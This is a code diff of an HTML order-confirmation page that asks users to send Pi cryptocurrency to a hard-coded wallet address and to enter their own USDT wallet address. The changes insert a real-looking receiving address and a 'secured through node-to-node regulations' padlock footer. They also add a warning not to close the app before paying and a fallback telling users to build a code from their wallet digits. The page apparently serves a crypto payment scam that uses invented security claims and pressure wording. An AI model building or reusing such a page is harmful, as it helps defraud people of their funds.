@@ -10,27 +10,37 @@
     <div class="container">
         <h1>Order Confirmation</h1>
         <div class="order-details">
-            <p>Selected Offer: 500 pi - £200</p>
-            <p>Transaction Code: <span id="transaction-code">Generating...</span></p>
+            <p>Transaction Code: <span id="transaction-code">Loading...</span></p>
             <p>USDT Wallet Address: <input type="text" id="usdt-address" name="usdt-address"></p>
-            <p>pi Wallet Address for Payment: <span id="wallet-address">ABC123XYZ456</span></p>
+            <p>pi Wallet Address for Payment: <span id="pi-wallet-address">GCVKOFPYI3HQYHXB3HD6QOS22DFG2IW5QXHDHBYXJ46RLUPJBHZM7MX5</span></p>
+            <button onclick="goBack()">Back</button> <!-- Back button added here -->
             <button onclick="nextStep()">Next</button>
         </div>
-        <p class="warning">Note: The minimum transactable amount of Pi is 300. Orders below this amount may take 12-24 hours for payment processing.</p>
+        <p class="warning">Note: The minimum transactable amount of Pi is 300. Orders below this amount may take 24-48 hours for payment processing.</p>
     </div>
 
     <script>
-        // Function to fetch the transaction code from the server
+        // Function to fetch the transaction code from the file
         async function fetchTransactionCode() {
-            const response = await fetch('/generate-transaction-code');
-            const data = await response.json();
-            return data.code;
+            try {
+                const response = await fetch('transaction-code.html');
+                const data = await response.text();
+                return data;
+            } catch (error) {
+                console.error('Error fetching transaction code:', error);
+                return 'Error fetching transaction code------ excess server queries (please use the first 2 and last 3 digits of your wallet address as code)';
+            }
         }
 
         // Function to update the transaction code in the HTML
         async function updateTransactionCode() {
             const transactionCode = await fetchTransactionCode();
             document.getElementById('transaction-code').innerText = transactionCode;
+        }
+
+        // Function to go back in the browser's history
+        function goBack() {
+            window.history.back();
         }
 
         // Function to proceed to the next step
@@ -45,7 +55,7 @@
     </script>
     <!-- Footer with the phrase and padlock icon -->
     <footer>
-        <span class="padlock-icon">🔒</span> Transactions within the Pi Network are secured through node-to-node regulations
-    </footer>
+        <span class="padlock-icon">🔒</span> Transactions within the Pi Network are secured through node-to-node regulations.
+        <span class="padlock-icon"></span> Do not cancel app until payment is done to avoid loss.
 </body>
 </html>
